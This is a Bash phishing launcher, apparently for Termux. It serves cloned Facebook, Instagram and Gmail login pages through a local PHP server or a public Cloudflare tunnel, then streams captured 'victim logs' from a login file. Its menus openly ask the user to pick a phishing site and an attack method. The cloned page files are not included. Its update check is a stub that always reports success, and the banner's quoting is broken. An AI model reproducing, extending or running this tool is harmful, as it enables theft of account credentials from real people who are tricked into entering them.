#!/bin/bash

# Colors
BLACK="\033[0;30m"
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
MAGENTA="\033[0;35m"
CYAN="\033[0;36m"
WHITE="\033[0;37m"
MAGENTA='\033[1;35m'
YELLOW2='\033[1;33m'

BRIGHT_BLACK="\033[1;90m"
BRIGHT_RED="\033[1;91m"
BRIGHT_GREEN="\033[1;92m"
BRIGHT_YELLOW="\033[1;93m"
BRIGHT_BLUE="\033[1;94m"
BRIGHT_MAGENTA="\033[1;95m"
BRIGHT_CYAN="\033[1;96m"
BRIGHT_WHITE="\033[1;97m"

NC="\033[0m"  # Reset

# Globals
HOST="127.0.0.1"
PHISH_DIR="sites"
SITE="facebook"
PORT="" # Only once random

# Functions
banner() {
    clear
    echo -e "${BRIGHT_CYAN}"
    echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████

                "  ████▒▒ ${YELLOW2}V1.1${BRIGHT_CYAN} ▒▒████"
    
  Feedback And Tell Which Phishing Sites You want         
             Instagram = @Shyam.npl1 
             Youtube = @FactStreamZS"
    echo -e "${NC}"
}

banner_small() {
    echo -e "${BRIGHT_GREEN}▌ PHISHER ▐${NC}"
}

install_deps() {
    echo -e "${BRIGHT_GREEN}[+] Checking & Installing Dependencies...${NC}"
    packages=(php curl cloudflared)

    for package in "${packages[@]}"; do
        if ! command -v $package > /dev/null 2>&1; then
            echo -e "${BRIGHT_CYAN}[•] Installing $package...${NC}"
            pkg install -y $package > /dev/null 2>&1
        else
            echo -e "${BRIGHT_GREEN}[✓] $package found.${NC}"
        fi
    done
}

random_port() {
    if [[ -z "$PORT" ]]; then
        PORT=$(shuf -i 1111-9999 -n 1)
    fi
}

check_update() {
    echo -e "${BRIGHT_GREEN}[+] Checking for updates...${NC}"
    sleep 1
    echo -e "${BRIGHT_GREEN}[✓] You're using the latest version.${NC}"
}

select_site() {
    banner_small
    echo -e "\n${BRIGHT_CYAN}[1] Facebook"
    echo -e "${BRIGHT_CYAN}[2] Instagram"
    echo -e "${BRIGHT_CYAN}[3] Gmail"
    echo -e "${BRIGHT_CYAN}[0] Exit"
    echo -ne "\n${BRIGHT_CYAN}[>] Select phishing site: ${NC}"
    read choice
    case $choice in
        1) SITE="facebook" ;;
        2) SITE="instagram" ;;
        3) SITE="gmail" ;;
        0) exit ;;
        *) echo -e "${RED}[!] Invalid option"; sleep 1; select_site ;;
    esac
}

setup_site() {
    if [ ! -d "$PHISH_DIR/$SITE" ]; then
        echo -e "${RED}[!] Site files for '$SITE' not found.${NC}"
        exit 1
    fi
    cp -rf "$PHISH_DIR/$SITE"/* .
}

capture_data() {
    echo -e "${BRIGHT_GREEN}[✓] Showing live login & victim logs... Press Ctrl+C to exit.${NC}"
    echo ""
    tail -f live_login.log
}

start_localhost() {
    random_port
    echo -e "\n${BRIGHT_GREEN}[+] Starting localhost on port $PORT...${NC}"
    setup_site
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 2
    echo -e "${BRIGHT_GREEN}[✓] Hosted at: ${BRIGHT_CYAN}http://$HOST:$PORT${NC}"
    capture_data
}

start_cloudflared() {
    if [[ -z "$PORT" ]]; then
        random_port
    fi

    echo -e "${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
    setup_site
    php -S "$HOST:$PORT" > /dev/null 2>&1 &
    sleep 5
    cloudflared tunnel --url "http://$HOST:$PORT" > .cfurl.log 2>&1 &
    sleep 8

    URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)

    if [[ $URL ]]; then
        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
        capture_data
    else
        echo -e "${RED}[!] Failed to fetch Cloudflare URL.${NC}"
    fi
}

attack_menu() {
    echo -e "\n${BRIGHT_YELLOW}[1] Localhost (Random Port)"
    echo -e "${BRIGHT_YELLOW}[2] Cloudflared"
    echo -e "${BRIGHT_YELLOW}[3] Back to Main Menu"
    echo -e "${BRIGHT_YELLOW}[0] Exit"
    echo -ne "\n${BRIGHT_YELLOW}[>] Choose attack method: ${NC}"
    read option
    case $option in
        1) start_localhost ;;
        2) start_cloudflared ;;
        3) main_menu ;;
        0) exit ;;
        *) echo -e "${RED}[!] Invalid option"; sleep 1; attack_menu ;;
    esac
}

main_menu() {
    banner
    install_deps
    check_update
    select_site
    attack_menu
}

# Start
main_menu